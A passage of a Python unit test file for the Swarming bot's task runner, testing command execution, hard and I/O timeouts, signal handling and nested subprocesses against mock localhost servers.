        'duration': 0.,\n          'exit_code': exit_code,\n          'hard_timeout': False,\n          'id': 'localhost',\n          'io_timeout': False,\n          'output': output,\n          'output_chunk_start': 0,\n          'task_id': 23,\n        },\n      }\n      if outputs_ref:\n        expected['data']['outputs_ref'] = outputs_ref\n      self.assertEqual(expected, kwargs)\n    return check_final\n\n  def _run_command(self, task_details):\n    start = time.time()\n    self.mock(time, 'time', lambda: start + 10)\n    server = 'https://localhost:1'\n    return task_runner.run_command(\n        server, task_details, self.work_dir, 3600., start, 1)\n\n  def test_load_and_run_raw(self):\n    server = 'https://localhost:1'\n\n    def run_command(\n        swarming_server, task_details, work_dir, cost_usd_hour, start,\n        min_free_space):\n      self.assertEqual(server, swarming_server)\n      # Necessary for OSX.\n      self.assertEqual(\n          os.path.realpath(self.work_dir), os.path.realpath(work_dir))\n      self.assertTrue(isinstance(task_details, task_runner.TaskDetails))\n      self.assertEqual(3600., cost_usd_hour)\n      self.assertEqual(time.time(), start)\n      self.assertEqual(1, min_free_space)\n      return {\n        u'exit_code': 1,\n        u'hard_timeout': False,\n        u'io_timeout': False,\n        u'must_signal_internal_failure': None,\n        u'version': task_runner.OUT_VERSION,\n      }\n    self.mock(task_runner, 'run_command', run_command)\n\n    manifest = os.path.join(self.root_dir, 'manifest')\n    with open(manifest, 'wb') as f:\n      data = {\n        'bot_id': 'localhost',\n        'command': ['a'],\n        'env': {'d': 'e'},\n        'extra_args': [],\n        'grace_period': 30.,\n        'hard_timeout': 10,\n        'inputs_ref': None,\n        'io_timeout': 11,\n        'task_id': 23,\n      }\n      json.dump(data, f)\n\n    out_file = os.path.join(self.root_dir, 'work', 'task_runner_out.json')\n    task_runner.load_and_run(manifest, server, 3600., time.time(), out_file, 1)\n    expected = {\n      u'exit_code': 1,\n      u'hard_timeout': False,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    with open(out_file, 'rb') as f:\n      self.assertEqual(expected, json.load(f))\n\n  def test_load_and_run_isolated(self):\n    self.expected_requests([])\n    server = 'https://localhost:1'\n\n    def run_command(\n        swarming_server, task_details, work_dir, cost_usd_hour, start,\n        min_free_space):\n      self.assertEqual(server, swarming_server)\n      # Necessary for OSX.\n      self.assertEqual(\n          os.path.realpath(self.work_dir), os.path.realpath(work_dir))\n      self.assertTrue(isinstance(task_details, task_runner.TaskDetails))\n      self.assertEqual(3600., cost_usd_hour)\n      self.assertEqual(time.time(), start)\n      self.assertEqual(1, min_free_space)\n      return {\n        u'exit_code': 0,\n        u'hard_timeout': False,\n        u'io_timeout': False,\n        u'must_signal_internal_failure': None,\n        u'version': task_runner.OUT_VERSION,\n      }\n    self.mock(task_runner, 'run_command', run_command)\n\n    manifest = os.path.join(self.root_dir, 'manifest')\n    with open(manifest, 'wb') as f:\n      data = {\n        'bot_id': 'localhost',\n        'command': None,\n        'env': {'d': 'e'},\n        'extra_args': ['foo', 'bar'],\n        'grace_period': 30.,\n        'hard_timeout': 10,\n        'io_timeout': 11,\n        'inputs_ref': {\n          'isolated': '123',\n          'isolatedserver': 'http://localhost:1',\n          'namespace': 'default-gzip',\n        },\n        'task_id': 23,\n      }\n      json.dump(data, f)\n\n    out_file = os.path.join(self.root_dir, 'work', 'task_runner_out.json')\n    task_runner.load_and_run(manifest, server, 3600., time.time(), out_file, 1)\n    expected = {\n      u'exit_code': 0,\n      u'hard_timeout': False,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    with open(out_file, 'rb') as f:\n      self.assertEqual(expected, json.load(f))\n\n  def test_run_command_raw(self):\n    # This runs the command for real.\n    self.requests(cost_usd=1, exit_code=0)\n    task_details = self.get_task_details('print(\\'hi\\')')\n    expected = {\n      u'exit_code': 0,\n      u'hard_timeout': False,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_run_command_isolated(self):\n    # This runs the command for real.\n    self.requests(\n        cost_usd=1, exit_code=0,\n        outputs_ref={\n          u'isolated': u'123',\n          u'isolatedserver': u'http://localhost:1',\n          u'namespace': u'default-gzip',\n        })\n    task_details = self.get_task_details(inputs_ref={\n      'isolated': '123',\n      'isolatedserver': 'localhost:1',\n      'namespace': 'default-gzip',\n    }, extra_args=['foo', 'bar'])\n    # Mock running run_isolated with a script.\n    SCRIPT_ISOLATED = (\n      'import json, sys;\\n'\n      'if len(sys.argv) != 2:\\n'\n      '  raise Exception(sys.argv);\\n'\n      'with open(sys.argv[1], \\'wb\\') as f:\\n'\n      '  json.dump({\\n'\n      '    \\'exit_code\\': 0,\\n'\n      '    \\'had_hard_timeout\\': False,\\n'\n      '    \\'internal_failure\\': None,\\n'\n      '    \\'outputs_ref\\': {\\n'\n      '      \\'isolated\\': \\'123\\',\\n'\n      '      \\'isolatedserver\\': \\'http://localhost:1\\',\\n'\n      '       \\'namespace\\': \\'default-gzip\\',\\n'\n      '    },\\n'\n      '  }, f)\\n'\n      'sys.stdout.write(\\'hi\\\\n\\')')\n    self.mock(\n        task_runner, 'get_isolated_cmd',\n        lambda _work_dir, _details, isolated_result, min_free_space:\n          [sys.executable, '-u', '-c', SCRIPT_ISOLATED, isolated_result])\n    expected = {\n      u'exit_code': 0,\n      u'hard_timeout': False,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_run_command_fail(self):\n    # This runs the command for real.\n    self.requests(cost_usd=10., exit_code=1)\n    task_details = self.get_task_details(\n        'import sys; print(\\'hi\\'); sys.exit(1)')\n    expected = {\n      u'exit_code': 1,\n      u'hard_timeout': False,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_run_command_os_error(self):\n    # This runs the command for real.\n    # OS specific error, fix expectation for other OSes.\n    output = (\n      'Command \"executable_that_shouldnt_be_on_your_system '\n      'thus_raising_OSError\" failed to start.\\n'\n      'Error: [Error 2] The system cannot find the file specified'\n      ) if sys.platform == 'win32' else (\n      'Command \"executable_that_shouldnt_be_on_your_system '\n      'thus_raising_OSError\" failed to start.\\n'\n      'Error: [Errno 2] No such file or directory')\n    self.requests(cost_usd=10., exit_code=1, output=output)\n    task_details = task_runner.TaskDetails(\n        {\n          'bot_id': 'localhost',\n          'command': [\n            'executable_that_shouldnt_be_on_your_system',\n            'thus_raising_OSError',\n          ],\n          'env': {},\n          'extra_args': [],\n          'grace_period': 30.,\n          'hard_timeout': 6,\n          'inputs_ref': None,\n          'io_timeout': 6,\n          'task_id': 23,\n        })\n    expected = {\n      u'exit_code': -1,\n      u'hard_timeout': False,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_run_command_large(self):\n    # Method should have \"self\" as first argument - pylint: disable=E0213\n    class Popen(object):\n      \"\"\"Mocks the process so we can control how data is returned.\"\"\"\n      def __init__(self2, cmd, cwd, env, stdout, stderr, stdin, detached):\n        self.assertEqual(task_details.command, cmd)\n        self.assertEqual(self.work_dir, cwd)\n        expected_env = os.environ.copy()\n        expected_env['foo'] = 'bar'\n        self.assertEqual(expected_env, env)\n        self.assertEqual(subprocess42.PIPE, stdout)\n        self.assertEqual(subprocess42.STDOUT, stderr)\n        self.assertEqual(subprocess42.PIPE, stdin)\n        self.assertEqual(True, detached)\n        self2._out = [\n          'hi!\\n',\n          'hi!\\n',\n          'hi!\\n' * 100000,\n          'hi!\\n',\n        ]\n\n      def yield_any(self2, maxsize, timeout):\n        self.assertLess(0, maxsize)\n        self.assertLess(0, timeout)\n        for i in self2._out:\n          yield 'stdout', i\n\n      @staticmethod\n      def wait():\n        return 0\n\n      @staticmethod\n      def kill():\n        self.fail()\n\n    self.mock(subprocess42, 'Popen', Popen)\n\n    def check_final(kwargs):\n      self.assertEqual(\n          {\n            'data': {\n              # That's because the cost includes the duration starting at start,\n              # not when the process was started.\n              'cost_usd': 10.,\n              'duration': 0.,\n              'exit_code': 0,\n              'hard_timeout': False,\n              'id': 'localhost',\n              'io_timeout': False,\n              'output': base64.b64encode('hi!\\n'),\n              'output_chunk_start': 100002*4,\n              'task_id': 23,\n            },\n          },\n          kwargs)\n\n    requests = [\n      (\n        'https://localhost:1/swarming/api/v1/bot/task_update/23',\n        {\n          'data': {\n            'cost_usd': 10.,\n            'id': 'localhost',\n            'task_id': 23,\n          },\n        },\n        {},\n      ),\n      (\n        'https://localhost:1/swarming/api/v1/bot/task_update/23',\n        {\n          'data': {\n            'cost_usd': 10.,\n            'id': 'localhost',\n            'output': base64.b64encode('hi!\\n' * 100002),\n            'output_chunk_start': 0,\n            'task_id': 23,\n          },\n        },\n        {},\n      ),\n      (\n        'https://localhost:1/swarming/api/v1/bot/task_update/23',\n        check_final,\n        {},\n      ),\n    ]\n    self.expected_requests(requests)\n    task_details = task_runner.TaskDetails(\n        {\n          'bot_id': 'localhost',\n          'command': ['large', 'executable'],\n          'env': {'foo': 'bar'},\n          'extra_args': [],\n          'grace_period': 30.,\n          'hard_timeout': 60,\n          'inputs_ref': None,\n          'io_timeout': 60,\n          'task_id': 23,\n        })\n    expected = {\n      u'exit_code': 0,\n      u'hard_timeout': False,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_main(self):\n    def load_and_run(\n        manifest, swarming_server, cost_usd_hour, start, json_file,\n        min_free_space):\n      self.assertEqual('foo', manifest)\n      self.assertEqual('http://localhost', swarming_server)\n      self.assertEqual(3600., cost_usd_hour)\n      self.assertEqual(time.time(), start)\n      self.assertEqual('task_summary.json', json_file)\n      self.assertEqual(1, min_free_space)\n\n    self.mock(task_runner, 'load_and_run', load_and_run)\n    cmd = [\n      '--swarming-server', 'http://localhost',\n      '--in-file', 'foo',\n      '--out-file', 'task_summary.json',\n      '--cost-usd-hour', '3600',\n      '--start', str(time.time()),\n      '--min-free-space', '1',\n    ]\n    self.assertEqual(0, task_runner.main(cmd))\n\n  def test_main_reboot(self):\n    def load_and_run(\n        manifest, swarming_server, cost_usd_hour, start, json_file,\n        min_free_space):\n      self.assertEqual('foo', manifest)\n      self.assertEqual('http://localhost', swarming_server)\n      self.assertEqual(3600., cost_usd_hour)\n      self.assertEqual(time.time(), start)\n      self.assertEqual('task_summary.json', json_file)\n      self.assertEqual(1, min_free_space)\n\n    self.mock(task_runner, 'load_and_run', load_and_run)\n    cmd = [\n      '--swarming-server', 'http://localhost',\n      '--in-file', 'foo',\n      '--out-file', 'task_summary.json',\n      '--cost-usd-hour', '3600',\n      '--start', str(time.time()),\n      '--min-free-space', '1',\n    ]\n    self.assertEqual(0, task_runner.main(cmd))\n\n\nclass TestTaskRunnerNoTimeMock(TestTaskRunnerBase):\n  # Do not mock time.time() for these tests otherwise it becomes a tricky\n  # implementation detail check.\n  # These test cases run the command for real.\n\n  # TODO(maruel): Calculate this value automatically through iteration?\n  SHORT_TIME_OUT = 0.3\n\n  # Here's a simple script that handles signals properly. Sadly SIGBREAK is not\n  # defined on posix.\n  SCRIPT_SIGNAL = (\n    'import signal, sys, time;\\n'\n    'l = [];\\n'\n    'def handler(signum, _):\\n'\n    '  l.append(signum);\\n'\n    '  print(\\'got signal %%d\\' %% signum);\\n'\n    '  sys.stdout.flush();\\n'\n    'signal.signal(%s, handler);\\n'\n    'print(\\'hi\\');\\n'\n    'sys.stdout.flush();\\n'\n    'while not l:\\n'\n    '  try:\\n'\n    '    time.sleep(0.01);\\n'\n    '  except IOError:\\n'\n    '    pass;\\n'\n    'print(\\'bye\\')') % (\n        'signal.SIGBREAK' if sys.platform == 'win32' else 'signal.SIGTERM')\n\n  SCRIPT_SIGNAL_HANG = (\n    'import signal, sys, time;\\n'\n    'l = [];\\n'\n    'def handler(signum, _):\\n'\n    '  l.append(signum);\\n'\n    '  print(\\'got signal %%d\\' %% signum);\\n'\n    '  sys.stdout.flush();\\n'\n    'signal.signal(%s, handler);\\n'\n    'print(\\'hi\\');\\n'\n    'sys.stdout.flush();\\n'\n    'while not l:\\n'\n    '  try:\\n'\n    '    time.sleep(0.01);\\n'\n    '  except IOError:\\n'\n    '    pass;\\n'\n    'print(\\'bye\\');\\n'\n    'time.sleep(100)') % (\n        'signal.SIGBREAK' if sys.platform == 'win32' else 'signal.SIGTERM')\n\n  SCRIPT_HANG = 'import time; print(\\'hi\\'); time.sleep(100)'\n\n  def get_check_final(\n      self, hard_timeout=False, io_timeout=False, exit_code=None,\n      output='hi\\n'):\n    def check_final(kwargs):\n      if hard_timeout or io_timeout:\n        self.assertLess(self.SHORT_TIME_OUT, kwargs['data'].pop('cost_usd'))\n        self.assertLess(self.SHORT_TIME_OUT, kwargs['data'].pop('duration'))\n      else:\n        self.assertLess(0., kwargs['data'].pop('cost_usd'))\n        self.assertLess(0., kwargs['data'].pop('duration'))\n      # It makes the diffing easier.\n      kwargs['data']['output'] = base64.b64decode(kwargs['data']['output'])\n      self.assertEqual(\n          {\n            'data': {\n              'exit_code': exit_code,\n              'hard_timeout': hard_timeout,\n              'id': 'localhost',\n              'io_timeout': io_timeout,\n              'output': output,\n              'output_chunk_start': 0,\n              'task_id': 23,\n            },\n          },\n          kwargs)\n    return check_final\n\n  def _load_and_run(self, manifest):\n    # Dot not mock time since this test class is testing timeouts.\n    server = 'https://localhost:1'\n    in_file = os.path.join(self.work_dir, 'task_runner_in.json')\n    with open(in_file, 'wb') as f:\n      json.dump(manifest, f)\n    out_file = os.path.join(self.work_dir, 'task_runner_out.json')\n    task_runner.load_and_run(in_file, server, 3600., time.time(), out_file, 1)\n    with open(out_file, 'rb') as f:\n      return json.load(f)\n\n  def _run_command(self, task_details):\n    # Dot not mock time since this test class is testing timeouts.\n    server = 'https://localhost:1'\n    return task_runner.run_command(\n        server, task_details, self.work_dir, 3600., time.time(), 1)\n\n  def test_hard(self):\n    # Actually 0xc000013a\n    sig = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM\n    self.requests(hard_timeout=True, exit_code=sig)\n    task_details = self.get_task_details(\n        self.SCRIPT_HANG, hard_timeout=self.SHORT_TIME_OUT)\n    expected = {\n      u'exit_code': sig,\n      u'hard_timeout': True,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_io(self):\n    # Actually 0xc000013a\n    sig = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM\n    self.requests(io_timeout=True, exit_code=sig)\n    task_details = self.get_task_details(\n        self.SCRIPT_HANG, io_timeout=self.SHORT_TIME_OUT)\n    expected = {\n      u'exit_code': sig,\n      u'hard_timeout': False,\n      u'io_timeout': True,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_hard_signal(self):\n    self.requests(\n        hard_timeout=True,\n        exit_code=0,\n        output='hi\\ngot signal %d\\nbye\\n' % task_runner.SIG_BREAK_OR_TERM)\n    task_details = self.get_task_details(\n        self.SCRIPT_SIGNAL, hard_timeout=self.SHORT_TIME_OUT)\n    # Returns 0 because the process cleaned up itself.\n    expected = {\n      u'exit_code': 0,\n      u'hard_timeout': True,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_io_signal(self):\n    self.requests(\n        io_timeout=True, exit_code=0,\n        output='hi\\ngot signal %d\\nbye\\n' % task_runner.SIG_BREAK_OR_TERM)\n    task_details = self.get_task_details(\n        self.SCRIPT_SIGNAL, io_timeout=self.SHORT_TIME_OUT)\n    # Returns 0 because the process cleaned up itself.\n    expected = {\n      u'exit_code': 0,\n      u'hard_timeout': False,\n      u'io_timeout': True,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_hard_no_grace(self):\n    # Actually 0xc000013a\n    sig = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM\n    self.requests(hard_timeout=True, exit_code=sig)\n    task_details = self.get_task_details(\n        self.SCRIPT_HANG, hard_timeout=self.SHORT_TIME_OUT,\n        grace_period=self.SHORT_TIME_OUT)\n    expected = {\n      u'exit_code': sig,\n      u'hard_timeout': True,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_io_no_grace(self):\n    # Actually 0xc000013a\n    sig = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM\n    self.requests(io_timeout=True, exit_code=sig)\n    task_details = self.get_task_details(\n        self.SCRIPT_HANG, io_timeout=self.SHORT_TIME_OUT,\n        grace_period=self.SHORT_TIME_OUT)\n    expected = {\n      u'exit_code': sig,\n      u'hard_timeout': False,\n      u'io_timeout': True,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_hard_signal_no_grace(self):\n    exit_code = 1 if sys.platform == 'win32' else -signal.SIGKILL\n    self.requests(\n        hard_timeout=True, exit_code=exit_code,\n        output='hi\\ngot signal %d\\nbye\\n' % task_runner.SIG_BREAK_OR_TERM)\n    task_details = self.get_task_details(\n        self.SCRIPT_SIGNAL_HANG, hard_timeout=self.SHORT_TIME_OUT,\n        grace_period=self.SHORT_TIME_OUT)\n    # Returns 0 because the process cleaned up itself.\n    expected = {\n      u'exit_code': exit_code,\n      u'hard_timeout': True,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_io_signal_no_grace(self):\n    exit_code = 1 if sys.platform == 'win32' else -signal.SIGKILL\n    self.requests(\n        io_timeout=True, exit_code=exit_code,\n        output='hi\\ngot signal %d\\nbye\\n' % task_runner.SIG_BREAK_OR_TERM)\n    task_details = self.get_task_details(\n        self.SCRIPT_SIGNAL_HANG, io_timeout=self.SHORT_TIME_OUT,\n        grace_period=self.SHORT_TIME_OUT)\n    # Returns 0 because the process cleaned up itself.\n    expected = {\n      u'exit_code': exit_code,\n      u'hard_timeout': False,\n      u'io_timeout': True,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual(expected, self._run_command(task_details))\n\n  def test_isolated_grand_children(self):\n    \"\"\"Runs a normal test involving 3 level deep subprocesses.\"\"\"\n    # Uses load_and_run()\n    files = {\n      'parent.py': (\n        'import subprocess, sys\\n'\n        'sys.exit(subprocess.call([sys.executable,\\'-u\\',\\'children.py\\']))\\n'),\n      'children.py': (\n        'import subprocess, sys\\n'\n        'sys.exit(subprocess.call('\n            '[sys.executable, \\'-u\\', \\'grand_children.py\\']))\\n'),\n      'grand_children.py': 'print \\'hi\\'',\n    }\n\n    def check_final(kwargs):\n      # Warning: this modifies input arguments.\n      self.assertLess(0, kwargs['data'].pop('cost_usd'))\n      self.assertLess(0, kwargs['data'].pop('bot_overhead'))\n      self.assertLess(0, kwargs['data'].pop('duration'))\n      self.assertLess(\n          0., kwargs['data']['isolated_stats']['download'].pop('duration'))\n      # duration==0 can happen on Windows when the clock is in the default\n      # resolution, 15.6ms.\n      self.assertLessEqual(\n          0., kwargs['data']['isolated_stats']['upload'].pop('duration'))\n      # Makes the diffing easier.\n      kwargs['data']['output'] = base64.b64decode(kwargs['data']['output'])\n      for k in ('download', 'upload'):\n        for j in ('items_cold', 'items_hot'):\n          kwargs['data']['isolated_stats'][k][j] = large.unpack(\n              base64.b64decode(kwargs['data']['isolated_stats'][k][j]))\n      self.assertEqual(\n          {\n            'data': {\n              'exit_code': 0,\n              'hard_timeout': False,\n              'id': u'localhost',\n              'io_timeout': False,\n              'isolated_stats': {\n                u'download': {\n                  u'initial_number_items': 0,\n                  u'initial_size': 0,\n                  u'items_cold': [10, 86, 94, 276],\n                  u'items_hot': [],\n                },\n                u'upload': {\n                  u'items_cold': [],\n                  u'items_hot': [],\n                },\n              },\n              'output': 'hi\\n',\n              'output_chunk_start': 0,\n              'task_id': 23,\n            },\n          },\n          kwargs)\n    requests = [\n      (\n        'https://localhost:1/swarming/api/v1/bot/task_update/23',\n        self.get_check_first(0.),\n        {},\n      ),\n      (\n        'https://localhost:1/swarming/api/v1/bot/task_update/23',\n        check_final,\n        {},\n      ),\n    ]\n    self.expected_requests(requests)\n\n    server = isolateserver_mock.MockIsolateServer()\n    try:\n      isolated = json.dumps({\n        'command': ['python', 'parent.py'],\n        'files': {\n          name: {\n            'h': server.add_content_compressed('default-gzip', content),\n            's': len(content),\n          } for name, content in files.iteritems()\n        },\n      })\n      isolated_digest = server.add_content_compressed('default-gzip', isolated)\n      manifest = get_manifest(\n          inputs_ref={\n            'isolated': isolated_digest,\n            'namespace': 'default-gzip',\n            'isolatedserver': server.url,\n          })\n      expected = {\n        u'exit_code': 0,\n        u'hard_timeout': False,\n        u'io_timeout': False,\n        u'must_signal_internal_failure': None,\n        u'version': task_runner.OUT_VERSION,\n      }\n      self.assertEqual(expected, self._load_and_run(manifest))\n    finally:\n      server.close()\n\n  def test_isolated_io_signal_no_grace_grand_children(self):\n    \"\"\"Handles grand-children process hanging and signal management.\n\n    In this case, the I/O timeout is implemented by task_runner. An hard timeout\n    would be implemented by run_isolated (depending on overhead).\n    \"\"\"\n    # Uses load_and_run()\n    # https://msdn.microsoft.com/library/cc704588.aspx\n    # STATUS_CONTROL_C_EXIT=0xC000013A. Python sees it as -1073741510.\n    exit_code = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM\n\n    files = {\n      'parent.py': (\n        'import subprocess, sys\\n'\n        'print(\\'parent\\')\\n'\n        'p = subprocess.Popen([sys.executable, \\'-u\\', \\'children.py\\'])\\n'\n        'print(p.pid)\\n'\n        'p.wait()\\n'\n        'sys.exit(p.returncode)\\n'),\n      'children.py': (\n        'import subprocess, sys\\n'\n        'print(\\'children\\')\\n'\n        'p = subprocess.Popen([sys.executable,\\'-u\\',\\'grand_children.py\\'])\\n'\n        'print(p.pid)\\n'\n        'p.wait()\\n'\n        'sys.exit(p.returncode)\\n'),\n      'grand_children.py': self.SCRIPT_SIGNAL_HANG,\n    }\n    # We need to catch the pid of the grand children to be able to kill it, so\n    # create our own check_final() instead of using self._gen_requests().\n    to_kill = []\n    def check_final(kwargs):\n      self.assertLess(self.SHORT_TIME_OUT, kwargs['data'].pop('cost_usd'))\n      self.assertLess(self.SHORT_TIME_OUT, kwargs['data'].pop('duration'))\n      self.assertLess(0., kwargs['data'].pop('bot_overhead'))\n      self.assertLess(\n          0., kwargs['data']['isolated_stats']['download'].pop('duration'))\n      self.assertLess(\n          0., kwargs['data']['isolated_stats']['upload'].pop('duration'))\n      # Makes the diffing easier.\n      for k in ('download', 'upload'):\n        for j in ('items_cold', 'items_hot'):\n          kwargs['data']['isolated_stats'][k][j] = large.unpack(\n              base64.b64decode(kwargs['data']['isolated_stats'][k][j]))\n      # The command print the pid of this child and grand-child processes, each\n      # on its line.\n      output = base64.b64decode(kwargs['data'].pop('output', ''))\n      for line in output.splitlines():\n        try:\n          to_kill.append(int(line))\n        except ValueError:\n          pass\n      self.assertEqual(\n          {\n            'data': {\n              'exit_code': exit_code,\n              'hard_timeout': False,\n              'id': u'localhost',\n              'io_timeout': True,\n              'isolated_stats': {\n                u'download': {\n                  u'initial_number_items': 0,\n                  u'initial_size': 0,\n                  u'items_cold': [144, 150, 285, 307],\n                  u'items_hot': [],\n                },\n                u'upload': {\n                  u'items_cold': [],\n                  u'items_hot': [],\n                },\n              },\n              'output_chunk_start': 0,\n              'task_id': 23,\n            },\n          },\n          kwargs)\n    requests = [\n      (\n        'https://localhost:1/swarming/api/v1/bot/task_update/23',\n        self.get_check_first(0.),\n        {},\n      ),\n      (\n        'https://localhost:1/swarming/api/v1/bot/task_update/23',\n        check_final,\n        {},\n      ),\n    ]\n    self.expected_requests(requests)\n\n    server = isolateserver_mock.MockIsolateServer()\n    try:\n      # TODO(maruel): -u is needed if you don't want python buffering to\n      # interfere.\n      isolated = json.dumps({\n        'command': ['python', '-u', 'parent.py'],\n        'files': {\n          name: {\n            'h': server.add_content_compressed('default-gzip', content),\n            's': len(content),\n          } for name, content in files.iteritems()\n        },\n      })\n      isolated_digest = server.add_content_compressed('default-gzip', isolated)\n      try:\n        manifest = get_manifest(\n            inputs_ref={\n              'isolated': isolated_digest,\n              'namespace': 'default-gzip',\n              'isolatedserver': server.url,\n            },\n            # TODO(maruel): A bit cheezy, we'd want the I/O timeout to be just\n            # enough to have the time for the PID to be printed but not more.\n            io_timeout=1,\n            grace_period=self.SHORT_TIME_OUT)\n        expected = {\n          u'exit_code': exit_code,\n          u'hard_timeout': False,\n          u'io_timeout': True,\n          u'must_signal_internal_failure': None,\n          u'version': task_runner.OUT_VERSION,\n        }\n        self.assertEqual(expected, self._load_and_run(manifest))\n        self.assertEqual(2, len(to_kill))\n      finally:\n        for k in to_kill:\n          try:\n            if sys.platform == 'win32':\n              os.kill(k, signal.SIGTERM)\n            else:\n              os.kill(k, signal.SIGKILL)\n          except OSError:\n            pass\n    finally:\n      server.close()\n\n\nclass TaskRunnerSmoke(unittest.TestCase):\n  # Runs a real process and a real Swarming fake server.\n  def setUp(self):\n    super(TaskRunnerSmoke, self).setUp()\n    self.root_dir = tempfile.mkdtemp(prefix='task_runner')\n    logging.info('Temp: %s', self.root_dir)\n    self._server = fake_swarming.Server(self)\n\n  def tearDown(self):\n    try:\n      self._server.shutdown()\n    finally:\n      try:\n        file_path.rmtree(self.root_dir)\n      except OSError:\n        print >> sys.stderr, 'Failed to delete %s' % self.root_dir\n      finally:\n        super(TaskRunnerSmoke, self).tearDown()\n\n  def test_signal(self):\n    # Tests when task_runner gets a SIGTERM.\n\n    # https://msdn.microsoft.com/library/cc704588.aspx\n    # STATUS_ENTRYPOINT_NOT_FOUND=0xc0000139. Python sees it as -1073741510.\n    exit_code = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM\n\n    os.mkdir(os.path.join(self.root_dir, 'work'))\n    signal_file = os.path.join(self.root_dir, 'work', 'signal')\n    open(signal_file, 'wb').close()\n    manifest = get_manifest(\n        script='import os,time;os.remove(%r);time.sleep(60)' % signal_file,\n        hard_timeout=60., io_timeout=60.)\n    task_in_file = os.path.join(self.root_dir, 'task_runner_in.json')\n    task_result_file = os.path.join(self.root_dir, 'task_runner_out.json')\n    with open(task_in_file, 'wb') as f:\n      json.dump(manifest, f)\n    bot = os.path.join(self.root_dir, 'swarming_bot.1.zip')\n    code, _ = fake_swarming.gen_zip(self._server.url)\n    with open(bot, 'wb') as f:\n      f.write(code)\n    cmd = [\n      sys.executable, bot, 'task_runner',\n      '--swarming-server', self._server.url,\n      '--in-file', task_in_file,\n      '--out-file', task_result_file,\n      '--cost-usd-hour', '1',\n      # Include the time taken to poll the task in the cost.\n      '--start', str(time.time()),\n    ]\n    logging.info('%s', cmd)\n    proc = subprocess42.Popen(cmd, cwd=self.root_dir, detached=True)\n    # Wait for the child process to be alive.\n    while os.path.isfile(signal_file):\n      time.sleep(0.01)\n    # Send SIGTERM to task_runner itself. Ensure the right thing happen.\n    # Note that on Windows, this is actually sending a SIGBREAK since there's no\n    # such thing as SIGTERM.\n    proc.send_signal(signal.SIGTERM)\n    proc.wait()\n    task_runner_log = os.path.join(self.root_dir, 'logs', 'task_runner.log')\n    with open(task_runner_log, 'rb') as f:\n      logging.info('task_runner.log:\\n---\\n%s---', f.read())\n    expected = {\n      u'exit_code': 0,\n      u'hard_timeout': False,\n      u'io_timeout': False,\n      u'must_signal_internal_failure': None,\n      u'version': task_runner.OUT_VERSION,\n    }\n    self.assertEqual([], self._server.get_events())\n    tasks = self._server.get_tasks()\n    for task in tasks.itervalues():\n      for event in task:\n        event.pop('cost_usd')\n        event.pop('duration', None)\n        event.pop('bot_overhead', None)\n    expected = {\n      '23': [\n        {\n          u'id': u'localhost',\n          u'task_id': 23,\n        },\n        {\n          u'exit_code': exit_code,\n          u'hard_timeout': False,\n          u'id': u'localhost',\n          u'io_timeout': False,\n          u'task_id': 23,\n        },\n      ],\n    }\n    self.assertEqual(expected, tasks)\n    expected = {\n      'swarming_bot.1.zip',\n      '4e019f31778ba7191f965469dc673280386bbd60-cacert.pem',\n      'work',\n      'logs',\n      # TODO(maruel): Move inside work.\n      'task_runner_in.json',\n      'task_runner_out.json',\n    }\n    self.assertEqual(expected, set(os.listdir(self.root_dir)))\n    expected = {\n      u'exit_code': exit_code,\n      u'hard_timeout': False,\n      u'io_timeout': False,\n      u'must_signal_internal_failure':\n          u'task_runner received signal %d' % task_runner.SIG_BREAK_OR_TERM,\n      u'version': 3,\n    }\n    with open(task_result_file, 'rb') as f:\n      self.assertEqual(expected, json.load(f))\n    self.assertEqual(0, proc.returncode)\n\n\nif __name__ == '__main__':\n  fix_encoding.fix_encoding()\n  if '-v' in sys.argv:\n    unittest.TestCase.maxDiff = None\n  logging_utils.prepare_logging(None)\n  logging_utils.set_console_level(\n      logging.DEBUG if '-v' in sys.argv else logging.CRITICAL+1)\n  # Fix litteral text expectation.\n  os.environ['LANG'] = 'en_US.UTF-8'\n  os.environ['LANGUAGE'] = 'en_US.UTF-8'\n  